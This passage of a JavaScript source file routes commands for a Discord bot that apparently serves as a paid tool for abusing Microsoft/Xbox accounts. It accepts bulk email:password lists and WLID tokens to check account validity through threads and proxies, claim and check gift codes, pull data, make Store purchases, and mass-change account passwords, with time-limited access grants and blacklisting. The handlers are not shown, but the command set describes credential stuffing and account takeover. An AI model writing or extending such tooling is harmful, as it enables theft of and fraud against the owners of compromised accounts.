    }
    return;
  }

  if (!interaction.isChatInputCommand()) return;

  const respond = (opts) => {
    if (interaction.deferred || interaction.replied) return interaction.editReply(opts);
    return interaction.reply(opts);
  };

  const { commandName, user } = interaction;

  try {
    if (commandName === "check") {
      await interaction.deferReply();
      const wlids = interaction.options.getString("wlids");
      const codes = interaction.options.getString("codes");
      const codesFile = interaction.options.getAttachment("codes_file");
      const threads = interaction.options.getInteger("threads") || 10;
      const dm = interaction.options.getBoolean("dm") || false;
      await handleCheck(respond, user.id, wlids, codes, codesFile, threads, dm ? user : null);
    }

    else if (commandName === "claim") {
      await interaction.deferReply();
      const accounts = interaction.options.getString("accounts");
      const accountsFile = interaction.options.getAttachment("accounts_file");
      const threads = interaction.options.getInteger("threads") || 5;
      const dm = interaction.options.getBoolean("dm") || false;
      await handleClaim(respond, user.id, accounts, accountsFile, threads, dm ? user : null);
    }

    else if (commandName === "pull") {
      await interaction.deferReply();
      const accounts = interaction.options.getString("accounts");
      const accountsFile = interaction.options.getAttachment("accounts_file");
      const dm = interaction.options.getBoolean("dm") || false;
      await handlePull(respond, user.id, accounts, accountsFile, dm ? user : null);
    }

    else if (commandName === "wlidset") {
      const wlids = interaction.options.getString("wlids");
      const wlidsFile = interaction.options.getAttachment("wlids_file");
      await handleWlidSet(respond, user.id, wlids, wlidsFile);
    }

    else if (commandName === "auth") {
      const target = interaction.options.getUser("user");
      const duration = interaction.options.getString("duration");
      await handleAuth(respond, user.id, target.id, duration);
    }

    else if (commandName === "deauth") {
      const target = interaction.options.getUser("user");
      await handleDeauth(respond, user.id, target.id);
    }

    else if (commandName === "authlist") {
      await handleAuthList(respond);
    }

    else if (commandName === "blacklist") {
      const target = interaction.options.getUser("user");
      const reason = interaction.options.getString("reason");
      await handleBlacklist(respond, user.id, target.id, reason);
    }

    else if (commandName === "unblacklist") {
      const target = interaction.options.getUser("user");
      await handleUnblacklist(respond, user.id, target.id);
    }

    else if (commandName === "blacklistshow") {
      await handleBlacklistShow(respond);
    }

    else if (commandName === "stats") {
      await handleStats(respond);
    }

    else if (commandName === "purchase") {
      await interaction.deferReply();
      const accounts = interaction.options.getString("accounts");
      const accountsFile = interaction.options.getAttachment("accounts_file");
      const product = interaction.options.getString("product");
      const dm = interaction.options.getBoolean("dm") || false;
      await handlePurchase(respond, user.id, accounts, accountsFile, product, dm ? user : null);
    }

    else if (commandName === "search") {
      const query = interaction.options.getString("query");
      await handleSearch(respond, query);
    }

    else if (commandName === "changer") {
      await interaction.deferReply();
      const accounts = interaction.options.getString("accounts");
      const accountsFile = interaction.options.getAttachment("accounts_file");
      const newPassword = interaction.options.getString("new_password");
      const threads = interaction.options.getInteger("threads") || 5;
      const dm = interaction.options.getBoolean("dm") || false;
      await handleChanger(respond, user.id, accounts, accountsFile, newPassword, threads, dm ? user : null);
    }

    else if (commandName === "checker") {
      await interaction.deferReply();
      const accounts = interaction.options.getString("accounts");
      const accountsFile = interaction.options.getAttachment("accounts_file");
      const threads = interaction.options.getInteger("threads") || 5;
      const dm = interaction.options.getBoolean("dm") || false;
      await handleAccountChecker(respond, user.id, accounts, accountsFile, threads, dm ? user : null);
    }

    else if (commandName === "help") {
      await respond({ embeds: [helpEmbed("/")] });
    }

    // ── Admin commands ──
    else if (commandName === "admin") {
      await handleAdminPanel(respond, user.id);
    }

    else if (commandName === "setwebhook") {
      const url = interaction.options.getString("url");
      await handleSetWebhook(respond, user.id, url);
    }

    else if (commandName === "botstats") {
      await handleBotStats(respond, user.id);
    }

    else if (commandName === "autopull") {
      const action = interaction.options.getString("action") || "start";
      const accounts = interaction.options.getString("accounts");
      const accountsFile = interaction.options.getAttachment("accounts_file");
      const interval = interaction.options.getString("interval");
      await handleAutoPull(respond, user.id, interaction.channelId, interaction.channel, accounts, accountsFile, interval, action);
    }
  } catch (err) {
    console.error(`Slash command error [${commandName}]:`, err);
    try { await respond({ embeds: [errorEmbed(err.message)] }); } catch {}
  }
});

// ── Dot Prefix Commands ──────────────────────────────────────

client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith(config.PREFIX)) return;

  const args = message.content.slice(config.PREFIX.length).trim().split(/\s+/);
  const cmd = args.shift()?.toLowerCase();
  if (!cmd) return;

  const respond = (opts) => message.reply(opts);

  try {
    if (cmd === "check") {
      const hasDm = args.includes("--dm");
      const filteredArgs = args.filter(a => a !== "--dm");
      const wlidsRaw = filteredArgs.join(" ");
      const attachment = message.attachments.first();
      if (!wlidsRaw && !attachment) {
        const storedCount = getWlidCount();
        const storedInfo = storedCount > 0 ? `\n\n**${storedCount} WLIDs stored** — just attach codes.txt to use them.` : "\n\nNo WLIDs stored. Use `.wlidset` first or provide WLIDs inline.";
        return respond({ embeds: [infoEmbed("Usage", "`.check [wlid_tokens]` + attach codes.txt [--dm]\n\nIf WLIDs are stored via `.wlidset`, just attach codes.\nAdd `--dm` to receive results in DMs." + storedInfo)] });
      }
      await handleCheck(respond, message.author.id, wlidsRaw, null, attachment, 10, hasDm ? message.author : null);
    }

    else if (cmd === "claim") {
      const hasDm = args.includes("--dm");
      const filteredArgs = args.filter(a => a !== "--dm");
      const accountsRaw = filteredArgs.join(" ");
      const attachment = message.attachments.first();
      if (!accountsRaw && !attachment) {
        return respond({ embeds: [infoEmbed("Usage", "`.claim <accounts>` [--dm]\nProvide email:password comma-separated or attach a `.txt` file.\nAdd `--dm` to receive results in DMs.\n\nExample:\n`.claim email@test.com:pass123 --dm`")] });
      }
      await handleClaim(respond, message.author.id, accountsRaw, attachment, 5, hasDm ? message.author : null);
    }

    else if (cmd === "pull") {
      const hasDm = args.includes("--dm");
      const filteredArgs = args.filter(a => a !== "--dm");
      const accountsRaw = filteredArgs.join(" ");
      const attachment = message.attachments.first();
      if (!accountsRaw && !attachment) {
        return respond({ embeds: [infoEmbed("Usage", "`.pull <accounts>` [--dm]\nProvide email:password comma-separated or attach a `.txt` file.\nAdd `--dm` to receive results in DMs.\n\nExample:\n`.pull email@test.com:pass123 --dm`")] });
      }
      await handlePull(respond, message.author.id, accountsRaw, attachment, hasDm ? message.author : null);
    }

    else if (cmd === "wlidset") {
      const wlidsRaw = args.join(" ");
      const attachment = message.attachments.first();
      if (!wlidsRaw && !attachment) {
        const storedCount = getWlidCount();
        return respond({ embeds: [infoEmbed("Usage", `\`.wlidset <wlid_tokens>\` or attach a .txt file\n\nReplaces all previously stored WLIDs.\n\nCurrently stored: **${storedCount}** WLIDs`)] });
      }
      await handleWlidSet(respond, message.author.id, wlidsRaw, attachment);
    }

    else if (cmd === "auth") {
      if (args.length < 2) {
        return respond({ embeds: [infoEmbed("Usage", "`.auth <@user or user_id> <duration>`\n\nDuration examples: `1h`, `7d`, `30d`, `1mo`, `forever`")] });
      }
      let targetId = args[0].replace(/[<@!>]/g, "");
      const duration = args.slice(1).join(" ");
      await handleAuth(respond, message.author.id, targetId, duration);
    }

    else if (cmd === "deauth") {
      if (args.length < 1) {
        return respond({ embeds: [infoEmbed("Usage", "`.deauth <@user or user_id>`")] });
      }
      let targetId = args[0].replace(/[<@!>]/g, "");
      await handleDeauth(respond, message.author.id, targetId);
    }

    else if (cmd === "authlist") {
      await handleAuthList(respond);
    }

    else if (cmd === "blacklist") {
      if (args.length < 1) {
        return respond({ embeds: [infoEmbed("Usage", "`.blacklist <@user or user_id> [reason]`")] });
      }
      let targetId = args[0].replace(/[<@!>]/g, "");
      const reason = args.slice(1).join(" ") || "No reason";
      await handleBlacklist(respond, message.author.id, targetId, reason);
    }

    else if (cmd === "unblacklist") {
      if (args.length < 1) {
        return respond({ embeds: [infoEmbed("Usage", "`.unblacklist <@user or user_id>`")] });
      }
      let targetId = args[0].replace(/[<@!>]/g, "");
      await handleUnblacklist(respond, message.author.id, targetId);
    }

    else if (cmd === "blacklistshow") {
      await handleBlacklistShow(respond);
    }

    else if (cmd === "stats") {
      await handleStats(respond);
    }

    else if (cmd === "purchase") {
      const hasDm = args.includes("--dm");
      const filteredArgs = args.filter(a => a !== "--dm");
      const productArg = filteredArgs.pop();
      const accountsRaw = filteredArgs.join(" ");
      const attachment = message.attachments.first();
      if (!productArg && !attachment) {
        return respond({ embeds: [infoEmbed("Usage", "`.purchase <accounts> <product_id_or_url>` [--dm]\nProvide email:password and a product ID or Microsoft Store URL.\nAttach a .txt file for multiple accounts.\n\nExample:\n`.purchase email@test.com:pass123 9NBLGGH4PNC7`")] });
      }
      await handlePurchase(respond, message.author.id, accountsRaw, attachment, productArg, hasDm ? message.author : null);
    }

    else if (cmd === "search") {
      const query = args.join(" ");
      await handleSearch(respond, query);
    }

    else if (cmd === "changer") {
      const hasDm = args.some(a => a === "--dm" || a === "—dm" || a === "–dm");
      const filteredArgs = args.filter(a => a !== "--dm" && a !== "—dm" && a !== "–dm");
      // Last arg is the new password
      const newPassword = filteredArgs.pop();
      const accountsRaw = filteredArgs.join(" ");
      const attachment = message.attachments.first();
      if (!newPassword && !attachment) {
        return respond({ embeds: [infoEmbed("Usage", "`.changer <accounts> <new_password>` [--dm]\nProvide email:password accounts and the new password.\nAttach a .txt file for multiple accounts.\n\nExample:\n`.changer email@test.com:oldpass NewPass123 --dm`")] });
      }
      await handleChanger(respond, message.author.id, accountsRaw, attachment, newPassword, 5, hasDm ? message.author : null);
    }

    else if (cmd === "checker") {
      const hasDm = args.some(a => a === "--dm" || a === "—dm" || a === "–dm");
      const filteredArgs = args.filter(a => a !== "--dm" && a !== "—dm" && a !== "–dm");
      const accountsRaw = filteredArgs.join(" ");
      const attachment = message.attachments.first();
      if (!accountsRaw && !attachment) {
        return respond({ embeds: [infoEmbed("Usage", "`.checker <accounts>` [--dm]\nProvide email:password accounts or attach a `.txt` file.\n\nExample:\n`.checker email@test.com:pass123 --dm`")] });
      }
      await handleAccountChecker(respond, message.author.id, accountsRaw, attachment, 5, hasDm ? message.author : null);
    }

    else if (cmd === "help") {
      return respond({ embeds: [helpEmbed(config.PREFIX)] });
    }

    // ── Admin commands (prefix) ──
    else if (cmd === "admin") {
      await handleAdminPanel(respond, message.author.id);
    }

    else if (cmd === "setwebhook") {
      const url = args[0];
      if (!url) return respond({ embeds: [errorEmbed("Usage: `.setwebhook <url>`")] });
      await handleSetWebhook(respond, message.author.id, url);
    }

    else if (cmd === "botstats") {
      await handleBotStats(respond, message.author.id);
    }

    else if (cmd === "autopull") {
      const action = args[0] || "start";
      if (action === "stop" || action === "list") {
        await handleAutoPull(respond, message.author.id, message.channelId, message.channel, null, null, null, action);
      } else {
        // .autopull <interval> + attach accounts.txt  OR  .autopull <accounts> <interval>
        const attachment = message.attachments.first();
        const interval = args[args.length - 1]; // last arg is interval
        const accountsRaw = args.slice(0, -1).join(" ");
        await handleAutoPull(respond, message.author.id, message.channelId, message.channel, accountsRaw, attachment, interval, "start");
      }
    }
  } catch (err) {
    console.error(`Prefix command error [${cmd}]:`, err);
    try { await respond({ embeds: [errorEmbed(err.message)] }); } catch {}
  }
});

// ── Ready ────────────────────────────────────────────────────

client.once("ready", () => {
  console.log(`Bot online as ${client.user.tag}`);
  console.log(`Owner: ${config.OWNER_ID}`);
  console.log(`Max concurrent users: ${config.MAX_CONCURRENT_USERS}`);
  console.log(`Stored WLIDs: ${getWlidCount()}`);
  
  // Load proxies on startup
  const proxyCount = loadProxies();
  console.log(`Proxies: ${config.USE_PROXIES ? `Enabled (${proxyCount} loaded)` : "Disabled"}`);
  
  client.user.setPresence({
    status: "online",
    activities: [{ name: ".gg/autizmens", type: 3 }],
  });
});

client.login(config.BOT_TOKEN);
